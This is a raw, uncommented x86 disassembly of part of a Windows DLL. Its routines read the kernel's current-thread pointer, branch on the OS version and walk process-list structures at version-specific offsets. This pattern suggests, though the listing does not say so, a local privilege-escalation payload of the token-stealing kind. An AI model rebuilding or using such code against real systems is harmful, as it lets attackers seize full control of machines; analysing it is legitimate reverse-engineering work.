100094c0:	8b 65 e8             	mov    -0x18(%ebp),%esp
100094c3:	c7 45 dc e4 ff ff ff 	movl   $0xffffffe4,-0x24(%ebp)
100094ca:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100094ce:	8b 45 dc             	mov    -0x24(%ebp),%eax
100094d1:	eb 03                	jmp    0x100094d6
100094d3:	6a 57                	push   $0x57
100094d5:	58                   	pop    %eax
100094d6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100094d9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100094e0:	5f                   	pop    %edi
100094e1:	5e                   	pop    %esi
100094e2:	5b                   	pop    %ebx
100094e3:	c9                   	leave
100094e4:	c3                   	ret
100094e5:	55                   	push   %ebp
100094e6:	8b ec                	mov    %esp,%ebp
100094e8:	6a ff                	push   $0xffffffff
100094ea:	68 60 e5 00 10       	push   $0x1000e560
100094ef:	68 00 c6 00 10       	push   $0x1000c600
100094f4:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100094fa:	50                   	push   %eax
100094fb:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10009502:	83 ec 38             	sub    $0x38,%esp
10009505:	53                   	push   %ebx
10009506:	56                   	push   %esi
10009507:	57                   	push   %edi
10009508:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000950b:	8b 75 0c             	mov    0xc(%ebp),%esi
1000950e:	85 f6                	test   %esi,%esi
10009510:	0f 84 a6 01 00 00    	je     0x100096bc
10009516:	83 7d 10 18          	cmpl   $0x18,0x10(%ebp)
1000951a:	0f 85 9c 01 00 00    	jne    0x100096bc
10009520:	68 20 03 01 10       	push   $0x10010320
10009525:	8b 7d 08             	mov    0x8(%ebp),%edi
10009528:	57                   	push   %edi
10009529:	e8 3b 06 00 00       	call   0x10009b69
1000952e:	59                   	pop    %ecx
1000952f:	59                   	pop    %ecx
10009530:	89 45 e0             	mov    %eax,-0x20(%ebp)
10009533:	85 c0                	test   %eax,%eax
10009535:	75 07                	jne    0x1000953e
10009537:	6a c1                	push   $0xffffffc1
10009539:	e9 80 01 00 00       	jmp    0x100096be
1000953e:	c7 45 dc e3 ff ff ff 	movl   $0xffffffe3,-0x24(%ebp)
10009545:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10009549:	ff 36                	push   (%esi)
1000954b:	57                   	push   %edi
1000954c:	e8 59 04 00 00       	call   0x100099aa
10009551:	59                   	pop    %ecx
10009552:	59                   	pop    %ecx
10009553:	89 45 d8             	mov    %eax,-0x28(%ebp)
10009556:	85 c0                	test   %eax,%eax
10009558:	75 04                	jne    0x1000955e
1000955a:	6a ec                	push   $0xffffffec
1000955c:	eb 40                	jmp    0x1000959e
1000955e:	68 f0 02 01 10       	push   $0x100102f0
10009563:	57                   	push   %edi
10009564:	e8 00 06 00 00       	call   0x10009b69
10009569:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000956c:	68 d4 02 01 10       	push   $0x100102d4
10009571:	57                   	push   %edi
10009572:	e8 f2 05 00 00       	call   0x10009b69
10009577:	83 c4 10             	add    $0x10,%esp
1000957a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000957d:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
10009581:	0f 84 17 01 00 00    	je     0x1000969e
10009587:	85 c0                	test   %eax,%eax
10009589:	0f 84 0f 01 00 00    	je     0x1000969e
1000958f:	ff 75 d8             	push   -0x28(%ebp)
10009592:	ff 55 d0             	call   *-0x30(%ebp)
10009595:	89 45 cc             	mov    %eax,-0x34(%ebp)
10009598:	85 c0                	test   %eax,%eax
1000959a:	75 0c                	jne    0x100095a8
1000959c:	6a e1                	push   $0xffffffe1
1000959e:	58                   	pop    %eax
1000959f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100095a3:	e9 17 01 00 00       	jmp    0x100096bf
100095a8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
100095af:	8b d8                	mov    %eax,%ebx
100095b1:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
100095b4:	33 c0                	xor    %eax,%eax
100095b6:	89 45 c8             	mov    %eax,-0x38(%ebp)
100095b9:	3b 43 78             	cmp    0x78(%ebx),%eax
100095bc:	73 73                	jae    0x10009631
100095be:	8b 8b 90 00 00 00    	mov    0x90(%ebx),%ecx
100095c4:	8b 3c c1             	mov    (%ecx,%eax,8),%edi
100095c7:	89 7d c0             	mov    %edi,-0x40(%ebp)
100095ca:	ff 76 04             	push   0x4(%esi)
100095cd:	57                   	push   %edi
100095ce:	ff 55 e0             	call   *-0x20(%ebp)
100095d1:	85 c0                	test   %eax,%eax
100095d3:	0f 84 85 00 00 00    	je     0x1000965e
100095d9:	8b 46 08             	mov    0x8(%esi),%eax
100095dc:	8a 4f 01             	mov    0x1(%edi),%cl
100095df:	3a 48 01             	cmp    0x1(%eax),%cl
100095e2:	75 7a                	jne    0x1000965e
100095e4:	83 65 bc 00          	andl   $0x0,-0x44(%ebp)
100095e8:	0f b6 47 01          	movzbl 0x1(%edi),%eax
100095ec:	39 45 bc             	cmp    %eax,-0x44(%ebp)
100095ef:	73 18                	jae    0x10009609
100095f1:	8b 45 bc             	mov    -0x44(%ebp),%eax
100095f4:	8d 04 85 08 00 00 00 	lea    0x8(,%eax,4),%eax
100095fb:	8b 4e 08             	mov    0x8(%esi),%ecx
100095fe:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
10009601:	89 0c 38             	mov    %ecx,(%eax,%edi,1)
10009604:	ff 45 bc             	incl   -0x44(%ebp)
10009607:	eb df                	jmp    0x100095e8
10009609:	80 7e 0c 00          	cmpb   $0x0,0xc(%esi)
1000960d:	74 1e                	je     0x1000962d
1000960f:	8d 83 90 00 00 00    	lea    0x90(%ebx),%eax
10009615:	8b 4d c8             	mov    -0x38(%ebp),%ecx
10009618:	c1 e1 03             	shl    $0x3,%ecx
1000961b:	8b 10                	mov    (%eax),%edx
1000961d:	8b 54 0a 04          	mov    0x4(%edx,%ecx,1),%edx
10009621:	89 56 14             	mov    %edx,0x14(%esi)
10009624:	8b 00                	mov    (%eax),%eax
10009626:	8b 56 10             	mov    0x10(%esi),%edx
10009629:	89 54 08 04          	mov    %edx,0x4(%eax,%ecx,1)
1000962d:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
10009631:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
10009635:	75 4d                	jne    0x10009684
10009637:	68 08 03 01 10       	push   $0x10010308
1000963c:	ff 75 08             	push   0x8(%ebp)
1000963f:	e8 25 05 00 00       	call   0x10009b69
10009644:	59                   	pop    %ecx
10009645:	59                   	pop    %ecx
10009646:	89 45 b8             	mov    %eax,-0x48(%ebp)
10009649:	85 c0                	test   %eax,%eax
1000964b:	75 25                	jne    0x10009672
1000964d:	6a ff                	push   $0xffffffff
1000964f:	8d 45 f0             	lea    -0x10(%ebp),%eax
10009652:	50                   	push   %eax
10009653:	e8 7e 3e 00 00       	call   0x1000d4d6
10009658:	59                   	pop    %ecx
10009659:	59                   	pop    %ecx
1000965a:	6a e0                	push   $0xffffffe0
1000965c:	eb 60                	jmp    0x100096be
1000965e:	81 7d c8 e8 03 00 00 	cmpl   $0x3e8,-0x38(%ebp)
10009665:	77 ca                	ja     0x10009631
10009667:	ff 45 c8             	incl   -0x38(%ebp)
1000966a:	8b 45 c8             	mov    -0x38(%ebp),%eax
1000966d:	e9 47 ff ff ff       	jmp    0x100095b9
10009672:	8d 8b d0 00 00 00    	lea    0xd0(%ebx),%ecx
10009678:	51                   	push   %ecx
10009679:	ff 73 78             	push   0x78(%ebx)
1000967c:	ff b3 90 00 00 00    	push   0x90(%ebx)
10009682:	ff d0                	call   *%eax
10009684:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10009688:	e8 02 00 00 00       	call   0x1000968f
1000968d:	eb 24                	jmp    0x100096b3
1000968f:	8b 45 d8             	mov    -0x28(%ebp),%eax
10009692:	05 e0 00 00 00       	add    $0xe0,%eax
10009697:	50                   	push   %eax
10009698:	ff 55 d4             	call   *-0x2c(%ebp)
1000969b:	c3                   	ret
1000969c:	eb 15                	jmp    0x100096b3
1000969e:	6a e0                	push   $0xffffffe0
100096a0:	e9 f9 fe ff ff       	jmp    0x1000959e
100096a5:	6a 01                	push   $0x1
100096a7:	58                   	pop    %eax
100096a8:	c3                   	ret
100096a9:	8b 65 e8             	mov    -0x18(%ebp),%esp
100096ac:	c7 45 dc e4 ff ff ff 	movl   $0xffffffe4,-0x24(%ebp)
100096b3:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100096b7:	8b 45 dc             	mov    -0x24(%ebp),%eax
100096ba:	eb 03                	jmp    0x100096bf
100096bc:	6a 57                	push   $0x57
100096be:	58                   	pop    %eax
100096bf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100096c2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100096c9:	5f                   	pop    %edi
100096ca:	5e                   	pop    %esi
100096cb:	5b                   	pop    %ebx
100096cc:	c9                   	leave
100096cd:	c3                   	ret
100096ce:	55                   	push   %ebp
100096cf:	8b ec                	mov    %esp,%ebp
100096d1:	6a ff                	push   $0xffffffff
100096d3:	68 78 e5 00 10       	push   $0x1000e578
100096d8:	68 00 c6 00 10       	push   $0x1000c600
100096dd:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100096e3:	50                   	push   %eax
100096e4:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100096eb:	83 ec 24             	sub    $0x24,%esp
100096ee:	53                   	push   %ebx
100096ef:	56                   	push   %esi
100096f0:	57                   	push   %edi
100096f1:	33 f6                	xor    %esi,%esi
100096f3:	39 75 08             	cmp    %esi,0x8(%ebp)
100096f6:	75 04                	jne    0x100096fc
100096f8:	6a 57                	push   $0x57
100096fa:	eb 6c                	jmp    0x10009768
100096fc:	ff 15 dc e0 00 10    	call   *0x1000e0dc
10009702:	0f b6 c8             	movzbl %al,%ecx
10009705:	89 4d d8             	mov    %ecx,-0x28(%ebp)
10009708:	33 c9                	xor    %ecx,%ecx
1000970a:	8a cc                	mov    %ah,%cl
1000970c:	0f b6 c1             	movzbl %cl,%eax
1000970f:	89 45 e0             	mov    %eax,-0x20(%ebp)
10009712:	56                   	push   %esi
10009713:	56                   	push   %esi
10009714:	56                   	push   %esi
10009715:	56                   	push   %esi
10009716:	56                   	push   %esi
10009717:	56                   	push   %esi
10009718:	56                   	push   %esi
10009719:	56                   	push   %esi
1000971a:	68 00 00 00 88       	push   $0x88000000
1000971f:	68 3c 03 01 10       	push   $0x1001033c
10009724:	68 2c 03 01 10       	push   $0x1001032c
10009729:	56                   	push   %esi
1000972a:	ff 15 04 e2 00 10    	call   *0x1000e204
10009730:	8b f8                	mov    %eax,%edi
10009732:	89 7d e4             	mov    %edi,-0x1c(%ebp)
10009735:	3b fe                	cmp    %esi,%edi
10009737:	75 04                	jne    0x1000973d
10009739:	6a d3                	push   $0xffffffd3
1000973b:	eb 2b                	jmp    0x10009768
1000973d:	6a 40                	push   $0x40
1000973f:	b8 00 10 00 00       	mov    $0x1000,%eax
10009744:	50                   	push   %eax
10009745:	50                   	push   %eax
10009746:	56                   	push   %esi
10009747:	ff 15 ec e0 00 10    	call   *0x1000e0ec
1000974d:	8b d8                	mov    %eax,%ebx
1000974f:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
10009752:	3b de                	cmp    %esi,%ebx
10009754:	75 04                	jne    0x1000975a
10009756:	6a d8                	push   $0xffffffd8
10009758:	eb 0e                	jmp    0x10009768
1000975a:	e8 65 01 00 00       	call   0x100098c4
1000975f:	89 45 cc             	mov    %eax,-0x34(%ebp)
10009762:	3b c6                	cmp    %esi,%eax
10009764:	75 05                	jne    0x1000976b
10009766:	6a bf                	push   $0xffffffbf
10009768:	58                   	pop    %eax
10009769:	eb 7f                	jmp    0x100097ea
1000976b:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
1000976f:	89 75 fc             	mov    %esi,-0x4(%ebp)
10009772:	8b 45 d8             	mov    -0x28(%ebp),%eax
10009775:	83 e8 04             	sub    $0x4,%eax
10009778:	74 4e                	je     0x100097c8
1000977a:	48                   	dec    %eax
1000977b:	74 15                	je     0x10009792
1000977d:	48                   	dec    %eax
1000977e:	75 5e                	jne    0x100097de
10009780:	ff 75 10             	push   0x10(%ebp)
10009783:	ff 75 0c             	push   0xc(%ebp)
10009786:	ff 75 08             	push   0x8(%ebp)
10009789:	57                   	push   %edi
1000978a:	53                   	push   %ebx
1000978b:	e8 aa 1f 00 00       	call   0x1000b73a
10009790:	eb 46                	jmp    0x100097d8
10009792:	39 75 e0             	cmp    %esi,-0x20(%ebp)
10009795:	75 12                	jne    0x100097a9
10009797:	ff 75 10             	push   0x10(%ebp)
1000979a:	ff 75 0c             	push   0xc(%ebp)
1000979d:	ff 75 08             	push   0x8(%ebp)
100097a0:	57                   	push   %edi
100097a1:	53                   	push   %ebx
100097a2:	e8 c8 1c 00 00       	call   0x1000b46f
100097a7:	eb 2f                	jmp    0x100097d8
100097a9:	83 7d e0 01          	cmpl   $0x1,-0x20(%ebp)
100097ad:	ff 75 10             	push   0x10(%ebp)
100097b0:	ff 75 0c             	push   0xc(%ebp)
100097b3:	ff 75 08             	push   0x8(%ebp)
100097b6:	57                   	push   %edi
100097b7:	53                   	push   %ebx
100097b8:	75 07                	jne    0x100097c1
100097ba:	e8 b0 13 00 00       	call   0x1000ab6f
100097bf:	eb 17                	jmp    0x100097d8
100097c1:	e8 07 0b 00 00       	call   0x1000a2cd
100097c6:	eb 10                	jmp    0x100097d8
100097c8:	ff 75 10             	push   0x10(%ebp)
100097cb:	ff 75 0c             	push   0xc(%ebp)
100097ce:	ff 75 08             	push   0x8(%ebp)
100097d1:	57                   	push   %edi
100097d2:	53                   	push   %ebx
100097d3:	e8 24 09 00 00       	call   0x1000a0fc
100097d8:	83 c4 14             	add    $0x14,%esp
100097db:	89 45 d0             	mov    %eax,-0x30(%ebp)
100097de:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100097e2:	e8 1a 00 00 00       	call   0x10009801
100097e7:	8b 45 d0             	mov    -0x30(%ebp),%eax
100097ea:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100097ed:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100097f4:	5f                   	pop    %edi
100097f5:	5e                   	pop    %esi
100097f6:	5b                   	pop    %ebx
100097f7:	c9                   	leave
100097f8:	c3                   	ret
100097f9:	33 f6                	xor    %esi,%esi
100097fb:	8b 7d e4             	mov    -0x1c(%ebp),%edi
100097fe:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
10009801:	39 75 cc             	cmp    %esi,-0x34(%ebp)
10009804:	74 12                	je     0x10009818
10009806:	ff 75 cc             	push   -0x34(%ebp)
10009809:	ff 15 e8 e0 00 10    	call   *0x1000e0e8
1000980f:	ff 75 cc             	push   -0x34(%ebp)
10009812:	ff 15 30 e1 00 10    	call   *0x1000e130
10009818:	3b fe                	cmp    %esi,%edi
1000981a:	74 07                	je     0x10009823
1000981c:	57                   	push   %edi
1000981d:	ff 15 08 e2 00 10    	call   *0x1000e208
10009823:	3b de                	cmp    %esi,%ebx
10009825:	74 0d                	je     0x10009834
10009827:	68 00 80 00 00       	push   $0x8000
1000982c:	56                   	push   %esi
1000982d:	53                   	push   %ebx
1000982e:	ff 15 e4 e0 00 10    	call   *0x1000e0e4
10009834:	c3                   	ret
10009835:	55                   	push   %ebp
10009836:	8b ec                	mov    %esp,%ebp
10009838:	56                   	push   %esi
10009839:	8b 75 10             	mov    0x10(%ebp),%esi
1000983c:	57                   	push   %edi
1000983d:	8b 7d 0c             	mov    0xc(%ebp),%edi
10009840:	85 ff                	test   %edi,%edi
10009842:	76 10                	jbe    0x10009854
10009844:	8b 45 08             	mov    0x8(%ebp),%eax
10009847:	8b ce                	mov    %esi,%ecx
10009849:	2b c6                	sub    %esi,%eax
1000984b:	8a 14 08             	mov    (%eax,%ecx,1),%dl
1000984e:	88 11                	mov    %dl,(%ecx)
10009850:	41                   	inc    %ecx
10009851:	4f                   	dec    %edi
10009852:	75 f7                	jne    0x1000984b
10009854:	8b 45 18             	mov    0x18(%ebp),%eax
10009857:	8b 4d 14             	mov    0x14(%ebp),%ecx
1000985a:	03 c6                	add    %esi,%eax
1000985c:	8b d1                	mov    %ecx,%edx
1000985e:	c1 ea 08             	shr    $0x8,%edx
10009861:	88 08                	mov    %cl,(%eax)
10009863:	88 50 01             	mov    %dl,0x1(%eax)
10009866:	8b d1                	mov    %ecx,%edx
10009868:	5f                   	pop    %edi
10009869:	c1 ea 10             	shr    $0x10,%edx
1000986c:	c1 e9 18             	shr    $0x18,%ecx
1000986f:	88 50 02             	mov    %dl,0x2(%eax)
10009872:	88 48 03             	mov    %cl,0x3(%eax)
10009875:	8b 45 20             	mov    0x20(%ebp),%eax
10009878:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
1000987b:	03 c6                	add    %esi,%eax
1000987d:	8b d1                	mov    %ecx,%edx
1000987f:	c1 ea 08             	shr    $0x8,%edx
10009882:	88 08                	mov    %cl,(%eax)
10009884:	88 50 01             	mov    %dl,0x1(%eax)
10009887:	8b d1                	mov    %ecx,%edx
10009889:	5e                   	pop    %esi
1000988a:	c1 ea 10             	shr    $0x10,%edx
1000988d:	c1 e9 18             	shr    $0x18,%ecx
10009890:	88 50 02             	mov    %dl,0x2(%eax)
10009893:	88 48 03             	mov    %cl,0x3(%eax)
10009896:	5d                   	pop    %ebp
10009897:	c3                   	ret
10009898:	55                   	push   %ebp
10009899:	8b ec                	mov    %esp,%ebp
1000989b:	56                   	push   %esi
1000989c:	8b 75 10             	mov    0x10(%ebp),%esi
1000989f:	57                   	push   %edi
100098a0:	8b 7d 0c             	mov    0xc(%ebp),%edi
100098a3:	85 ff                	test   %edi,%edi
100098a5:	76 10                	jbe    0x100098b7
100098a7:	8b 45 08             	mov    0x8(%ebp),%eax
100098aa:	8b ce                	mov    %esi,%ecx
100098ac:	2b c6                	sub    %esi,%eax
100098ae:	8a 14 08             	mov    (%eax,%ecx,1),%dl
100098b1:	88 11                	mov    %dl,(%ecx)
100098b3:	41                   	inc    %ecx
100098b4:	4f                   	dec    %edi
100098b5:	75 f7                	jne    0x100098ae
100098b7:	8b 45 18             	mov    0x18(%ebp),%eax
100098ba:	8a 4d 14             	mov    0x14(%ebp),%cl
100098bd:	5f                   	pop    %edi
100098be:	88 0c 06             	mov    %cl,(%esi,%eax,1)
100098c1:	5e                   	pop    %esi
100098c2:	5d                   	pop    %ebp
100098c3:	c3                   	ret
100098c4:	56                   	push   %esi
100098c5:	57                   	push   %edi
100098c6:	68 70 01 01 10       	push   $0x10010170
100098cb:	6a 00                	push   $0x0
100098cd:	68 00 00 10 00       	push   $0x100000
100098d2:	ff 15 f0 e0 00 10    	call   *0x1000e0f0
100098d8:	8b f8                	mov    %eax,%edi
100098da:	85 ff                	test   %edi,%edi
100098dc:	75 11                	jne    0x100098ef
100098de:	ff 15 60 e1 00 10    	call   *0x1000e160
100098e4:	50                   	push   %eax
100098e5:	ff 15 d4 e0 00 10    	call   *0x1000e0d4
100098eb:	33 c0                	xor    %eax,%eax
100098ed:	eb 44                	jmp    0x10009933
100098ef:	68 98 3a 00 00       	push   $0x3a98
100098f4:	57                   	push   %edi
100098f5:	ff 15 84 e0 00 10    	call   *0x1000e084
100098fb:	8b f0                	mov    %eax,%esi
100098fd:	81 fe 80 00 00 00    	cmp    $0x80,%esi
10009903:	74 2c                	je     0x10009931
10009905:	85 f6                	test   %esi,%esi
10009907:	74 28                	je     0x10009931
10009909:	53                   	push   %ebx
1000990a:	ff 15 60 e1 00 10    	call   *0x1000e160
10009910:	57                   	push   %edi
10009911:	8b d8                	mov    %eax,%ebx
10009913:	ff 15 30 e1 00 10    	call   *0x1000e130
10009919:	81 fe 02 01 00 00    	cmp    $0x102,%esi
1000991f:	75 04                	jne    0x10009925
10009921:	6a 79                	push   $0x79
10009923:	eb 01                	jmp    0x10009926
10009925:	53                   	push   %ebx
10009926:	ff 15 d4 e0 00 10    	call   *0x1000e0d4
1000992c:	33 c0                	xor    %eax,%eax
1000992e:	5b                   	pop    %ebx
1000992f:	eb 02                	jmp    0x10009933
10009931:	8b c7                	mov    %edi,%eax
10009933:	5f                   	pop    %edi
10009934:	5e                   	pop    %esi
10009935:	c3                   	ret
10009936:	55                   	push   %ebp
10009937:	8b ec                	mov    %esp,%ebp
10009939:	51                   	push   %ecx
1000993a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000993e:	56                   	push   %esi
1000993f:	8b 75 08             	mov    0x8(%ebp),%esi
10009942:	68 84 e5 00 10       	push   $0x1000e584
10009947:	56                   	push   %esi
10009948:	e8 1c 02 00 00       	call   0x10009b69
1000994d:	59                   	pop    %ecx
1000994e:	85 c0                	test   %eax,%eax
10009950:	59                   	pop    %ecx
10009951:	74 07                	je     0x1000995a
10009953:	ff d0                	call   *%eax
10009955:	89 45 fc             	mov    %eax,-0x4(%ebp)
10009958:	eb 4a                	jmp    0x100099a4
1000995a:	85 f6                	test   %esi,%esi
1000995c:	75 04                	jne    0x10009962
1000995e:	33 c0                	xor    %eax,%eax
10009960:	eb 45                	jmp    0x100099a7
10009962:	8b 46 08             	mov    0x8(%esi),%eax
10009965:	83 f8 05             	cmp    $0x5,%eax
10009968:	75 1b                	jne    0x10009985
1000996a:	83 7e 0c 02          	cmpl   $0x2,0xc(%esi)
1000996e:	75 15                	jne    0x10009985
10009970:	66 83 7e 10 01       	cmpw   $0x1,0x10(%esi)
10009975:	72 0e                	jb     0x10009985
10009977:	64 a1 24 01 00 00    	mov    %fs:0x124,%eax
1000997d:	8b 40 38             	mov    0x38(%eax),%eax
10009980:	89 45 fc             	mov    %eax,-0x4(%ebp)
10009983:	eb 1f                	jmp    0x100099a4
10009985:	83 f8 06             	cmp    $0x6,%eax
10009988:	75 0e                	jne    0x10009998
1000998a:	64 a1 24 01 00 00    	mov    %fs:0x124,%eax
10009990:	8b 40 48             	mov    0x48(%eax),%eax
10009993:	89 45 fc             	mov    %eax,-0x4(%ebp)
10009996:	eb 0c                	jmp    0x100099a4
10009998:	64 a1 24 01 00 00    	mov    %fs:0x124,%eax
1000999e:	8b 40 44             	mov    0x44(%eax),%eax
100099a1:	89 45 fc             	mov    %eax,-0x4(%ebp)
100099a4:	8b 45 fc             	mov    -0x4(%ebp),%eax
100099a7:	5e                   	pop    %esi
100099a8:	c9                   	leave
100099a9:	c3                   	ret
100099aa:	55                   	push   %ebp
100099ab:	8b ec                	mov    %esp,%ebp
100099ad:	8b 45 08             	mov    0x8(%ebp),%eax
100099b0:	56                   	push   %esi
100099b1:	33 f6                	xor    %esi,%esi
100099b3:	3b c6                	cmp    %esi,%eax
100099b5:	74 46                	je     0x100099fd
100099b7:	8b 48 08             	mov    0x8(%eax),%ecx
100099ba:	83 e9 04             	sub    $0x4,%ecx
100099bd:	0f 84 5b 01 00 00    	je     0x10009b1e
100099c3:	49                   	dec    %ecx
100099c4:	74 3c                	je     0x10009a02
100099c6:	49                   	dec    %ecx
100099c7:	75 34                	jne    0x100099fd
100099c9:	50                   	push   %eax
100099ca:	e8 67 ff ff ff       	call   0x10009936
100099cf:	59                   	pop    %ecx
100099d0:	33 d2                	xor    %edx,%edx
100099d2:	8b c8                	mov    %eax,%ecx
100099d4:	3b ce                	cmp    %esi,%ecx
100099d6:	74 27                	je     0x100099ff
100099d8:	8b b0 9c 00 00 00    	mov    0x9c(%eax),%esi
100099de:	3b 75 0c             	cmp    0xc(%ebp),%esi
100099e1:	74 1c                	je     0x100099ff
100099e3:	8b 80 a0 00 00 00    	mov    0xa0(%eax),%eax
100099e9:	2d a0 00 00 00       	sub    $0xa0,%eax
100099ee:	74 0d                	je     0x100099fd
100099f0:	3b c1                	cmp    %ecx,%eax
100099f2:	74 09                	je     0x100099fd
100099f4:	42                   	inc    %edx
100099f5:	81 fa e8 03 00 00    	cmp    $0x3e8,%edx
100099fb:	7e db                	jle    0x100099d8
100099fd:	33 c0                	xor    %eax,%eax
100099ff:	5e                   	pop    %esi
10009a00:	5d                   	pop    %ebp
10009a01:	c3                   	ret
10009a02:	8b 48 0c             	mov    0xc(%eax),%ecx
10009a05:	3b ce                	cmp    %esi,%ecx
10009a07:	75 38                	jne    0x10009a41
10009a09:	50                   	push   %eax
10009a0a:	e8 27 ff ff ff       	call   0x10009936
10009a0f:	8b 55 0c             	mov    0xc(%ebp),%edx
10009a12:	59                   	pop    %ecx
10009a13:	8b c8                	mov    %eax,%ecx
10009a15:	39 91 9c 00 00 00    	cmp    %edx,0x9c(%ecx)
10009a1b:	74 e2                	je     0x100099ff
10009a1d:	8b 80 a0 00 00 00    	mov    0xa0(%eax),%eax
10009a23:	2d a0 00 00 00       	sub    $0xa0,%eax
10009a28:	74 d3                	je     0x100099fd
10009a2a:	3b c1                	cmp    %ecx,%eax
10009a2c:	74 cf                	je     0x100099fd
10009a2e:	46                   	inc    %esi
10009a2f:	81 fe e8 03 00 00    	cmp    $0x3e8,%esi
10009a35:	7f c6                	jg     0x100099fd
10009a37:	39 90 9c 00 00 00    	cmp    %edx,0x9c(%eax)
10009a3d:	75 de                	jne    0x10009a1d
10009a3f:	eb be                	jmp    0x100099ff
10009a41:	83 f9 01             	cmp    $0x1,%ecx
10009a44:	75 38                	jne    0x10009a7e
10009a46:	50                   	push   %eax
10009a47:	e8 ea fe ff ff       	call   0x10009936
10009a4c:	8b 55 0c             	mov    0xc(%ebp),%edx
10009a4f:	59                   	pop    %ecx
10009a50:	8b c8                	mov    %eax,%ecx
10009a52:	39 91 84 00 00 00    	cmp    %edx,0x84(%ecx)
10009a58:	74 a5                	je     0x100099ff
10009a5a:	8b 80 88 00 00 00    	mov    0x88(%eax),%eax
10009a60:	2d 88 00 00 00       	sub    $0x88,%eax
10009a65:	74 96                	je     0x100099fd
10009a67:	3b c1                	cmp    %ecx,%eax
10009a69:	74 92                	je     0x100099fd
10009a6b:	46                   	inc    %esi
10009a6c:	81 fe e8 03 00 00    	cmp    $0x3e8,%esi
10009a72:	7f 89                	jg     0x100099fd
10009a74:	39 90 84 00 00 00    	cmp    %edx,0x84(%eax)
10009a7a:	75 de                	jne    0x10009a5a
10009a7c:	eb 81                	jmp    0x100099ff
10009a7e:	83 f9 02             	cmp    $0x2,%ecx
10009a81:	0f 85 76 ff ff ff    	jne    0x100099fd
10009a87:	66 39 70 10          	cmp    %si,0x10(%eax)
10009a8b:	50                   	push   %eax
10009a8c:	75 4a                	jne    0x10009ad8
10009a8e:	e8 a3 fe ff ff       	call   0x10009936
10009a93:	8b 55 0c             	mov    0xc(%ebp),%edx
10009a96:	59                   	pop    %ecx
10009a97:	8b c8                	mov    %eax,%ecx
10009a99:	39 91 84 00 00 00    	cmp    %edx,0x84(%ecx)
10009a9f:	0f 84 5a ff ff ff    	je     0x100099ff
10009aa5:	8b 80 88 00 00 00    	mov    0x88(%eax),%eax
10009aab:	2d 88 00 00 00       	sub    $0x88,%eax
10009ab0:	0f 84 47 ff ff ff    	je     0x100099fd
10009ab6:	3b c1                	cmp    %ecx,%eax
10009ab8:	0f 84 3f ff ff ff    	je     0x100099fd
10009abe:	46                   	inc    %esi
10009abf:	81 fe e8 03 00 00    	cmp    $0x3e8,%esi
10009ac5:	0f 8f 32 ff ff ff    	jg     0x100099fd
10009acb:	39 90 84 00 00 00    	cmp    %edx,0x84(%eax)
10009ad1:	75 d2                	jne    0x10009aa5
10009ad3:	e9 27 ff ff ff       	jmp    0x100099ff
10009ad8:	e8 59 fe ff ff       	call   0x10009936
10009add:	59                   	pop    %ecx
10009ade:	8b c8                	mov    %eax,%ecx
10009ae0:	3b ce                	cmp    %esi,%ecx
10009ae2:	0f 84 17 ff ff ff    	je     0x100099ff
10009ae8:	8b 90 94 00 00 00    	mov    0x94(%eax),%edx
10009aee:	3b 55 0c             	cmp    0xc(%ebp),%edx
10009af1:	0f 84 08 ff ff ff    	je     0x100099ff
10009af7:	8b 80 98 00 00 00    	mov    0x98(%eax),%eax
10009afd:	2d 98 00 00 00       	sub    $0x98,%eax
10009b02:	0f 84 f5 fe ff ff    	je     0x100099fd
10009b08:	3b c1                	cmp    %ecx,%eax
10009b0a:	0f 84 ed fe ff ff    	je     0x100099fd
10009b10:	46                   	inc    %esi
10009b11:	81 fe e8 03 00 00    	cmp    $0x3e8,%esi
10009b17:	7e cf                	jle    0x10009ae8
10009b19:	e9 df fe ff ff       	jmp    0x100099fd
10009b1e:	50                   	push   %eax
10009b1f:	e8 12 fe ff ff       	call   0x10009936
10009b24:	8b 55 0c             	mov    0xc(%ebp),%edx
10009b27:	59                   	pop    %ecx
10009b28:	8b c8                	mov    %eax,%ecx
10009b2a:	39 91 94 00 00 00    	cmp    %edx,0x94(%ecx)
10009b30:	0f 84 c9 fe ff ff    	je     0x100099ff
10009b36:	8b 80 98 00 00 00    	mov    0x98(%eax),%eax
10009b3c:	2d 98 00 00 00       	sub    $0x98,%eax
10009b41:	0f 84 b6 fe ff ff    	je     0x100099fd
10009b47:	3b c1                	cmp    %ecx,%eax
10009b49:	0f 84 ae fe ff ff    	je     0x100099fd
10009b4f:	46                   	inc    %esi
10009b50:	81 fe e8 03 00 00    	cmp    $0x3e8,%esi
10009b56:	0f 8f a1 fe ff ff    	jg     0x100099fd
10009b5c:	39 90 94 00 00 00    	cmp    %edx,0x94(%eax)
10009b62:	75 d2                	jne    0x10009b36
10009b64:	e9 96 fe ff ff       	jmp    0x100099ff
10009b69:	55                   	push   %ebp
10009b6a:	8b ec                	mov    %esp,%ebp
10009b6c:	51                   	push   %ecx
